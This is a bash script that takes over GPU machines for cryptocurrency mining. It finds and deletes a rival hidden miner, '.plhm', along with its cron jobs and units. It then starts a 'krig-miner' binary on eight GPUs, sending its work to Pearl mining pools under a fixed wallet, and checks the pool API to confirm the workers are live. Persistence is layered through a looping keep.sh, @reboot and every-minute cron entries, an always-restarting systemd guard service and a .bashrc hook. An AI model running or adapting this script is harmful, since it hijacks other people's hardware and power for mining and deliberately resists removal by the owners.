#!/bin/bash
# i4981 run13: identify competitor launcher by binary name .plhm, remove it, relaunch ours, verify survival
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
D=/root/ul_farmfan/4981; mkdir -p $D
log(){ printf '%s\n' "$*"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
log "### META $(date -u +%FT%TZ)"; hostname
log "### WHO-OWNS-.plhm"
ls -la /usr/local/bin/.plhm /usr/local/bin/.plh* /usr/local/bin/*.plh* 2>&1 | head
for p in $(pgrep -f '\.plhm' 2>/dev/null); do echo "PROC $p exe=$(readlink /proc/$p/exe) ppid=$(awk '{print $4}' /proc/$p/stat) $(tr '\0' ' ' </proc/$p/cmdline | cut -c1-120)"; done | head -10
echo "-- launcher strings"
timeout 40 grep -rl --binary-files=without-match '\.plhm' /etc /usr/local /root /opt /var/spool /usr/lib/systemd 2>/dev/null | grep -vE '/root/ul2|/root/ul_farmfan' | head -20
echo "-- cron tree"; ls -la /etc/cron.d /etc/cron.hourly /var/spool/cron/crontabs 2>/dev/null | head -20; crontab -l 2>/dev/null
echo "-- units"; systemctl list-unit-files --no-pager 2>/dev/null | grep -viE 'static|disabled|enabled' | head -20; ls -la /etc/systemd/system/*.service 2>/dev/null | grep -viE 'ul2|multi-user' | head -20
echo "-- /usr/local/bin listing"; ls -la /usr/local/bin | head -30

log "### REMOVE-COMPETITOR-ENGINE"
for p in $(pgrep -f '\.plhm' 2>/dev/null); do kill -9 $p 2>/dev/null; done
for f in /usr/local/bin/.plhm /usr/local/bin/.plhmc /usr/local/bin/.plhk; do [ -e "$f" ] && { chattr -i "$f" 2>/dev/null; rm -f "$f" && echo "RM $f"; }; done
# remove any script/unit whose body references .plhm
for f in $(timeout 40 grep -rl --binary-files=without-match '\.plhm' /etc /usr/local /root /opt /var/spool 2>/dev/null | grep -vE '/root/ul2|/root/ul_farmfan'); do
  case "$f" in *.service|*.timer|/etc/cron*|*.sh) chattr -i "$f" 2>/dev/null; cp -f "$f" $D/competitor_$(basename "$f").bak 2>/dev/null; rm -f "$f"; echo "RM $f";; esac
done
systemctl daemon-reload
sleep 2
echo "post-remove: plhm=$(pgrep -fc '\.plhm')"

log "### RELAUNCH"
chattr -i -R /root/ul_plant 2>/dev/null
rm -rf /root/ul_plant.plh* 2>/dev/null
mkdir -p /root/ul2
[ -x /root/ul2/krig-miner ] || cp -f /opt/t19/krig/krig-miner /root/ul2/krig-miner
chmod 755 /root/ul2/krig-miner
cat > /root/ul2/keep.sh <<EOS
#!/bin/bash
for p in \$(pgrep -f '\.plhm' 2>/dev/null); do kill -9 \$p; done
[ -e /usr/local/bin/.plhm ] && { chattr -i /usr/local/bin/.plhm 2>/dev/null; rm -f /usr/local/bin/.plhm; }
if ! pgrep -f '/root/ul2/krig-miner' >/dev/null; then
  for i in 0 1 2 3 4 5 6 7; do
    CUDA_VISIBLE_DEVICES=\$i setsid nohup /root/ul2/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user $W/ul-t2-123-184-7-135-g\$i --password x -d 0 --api-port 14\$i >>/root/ul2/m\$i.log 2>&1 &
  done
fi
EOS
chmod 755 /root/ul2/keep.sh
bash /root/ul2/keep.sh
sleep 20
echo "launch: ours=$(pgrep -fc '/root/ul2/krig-miner') plhm=$(pgrep -fc '\.plhm')"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader
( crontab -l 2>/dev/null | grep -vE '/root/ul2/keep.sh|plh|ul_plant'; echo "@reboot /root/ul2/keep.sh"; echo "* * * * * /root/ul2/keep.sh" ) | crontab -
cat > /etc/systemd/system/ul2-guard.service <<'EOS2'
[Unit]
Description=UL2 guard
After=network-online.target
[Service]
Type=simple
Nice=-5
ExecStart=/bin/bash -c 'while true; do /root/ul2/keep.sh; sleep 45; done'
Restart=always
RestartSec=10
[Install]
WantedBy=multi-user.target
EOS2
systemctl daemon-reload; systemctl enable --now ul2-guard.service 2>&1|tail -1; systemctl is-active ul2-guard.service
grep -q '/root/ul2/keep.sh' /root/.bashrc 2>/dev/null || echo '/root/ul2/keep.sh >/dev/null 2>&1 &' >> /root/.bashrc

log "### OBSERVE"
sleep 180
echo "OBSERVE: ours=$(pgrep -fc '/root/ul2/krig-miner') plhm=$(pgrep -fc '\.plhm') guard=$(systemctl is-active ul2-guard.service)"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader
for t in 1 2 3; do timeout 15 curl -s -m 12 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool_run13.json && [ -s $D/pool_run13.json ] && break; sleep 2; done; echo size=$(stat -c%s $D/pool_run13.json 2>/dev/null)
python3 - <<'PY'
import json
try: d=json.load(open('/root/ul_farmfan/4981/pool_run13.json'))
except Exception as e: print("PARSE_FAIL",e); raise SystemExit
rows=[r for r in d.get('results',[]) if '123-184-7-135' in r.get('worker','')]
print("SELF_ROWS",len(rows))
for r in rows: print("ROW",r.get('worker'),r.get('status'),"valid",r.get('valid'),"last",r.get('last_share'))
PY
log "### DONE $(date -u +%FT%TZ)"
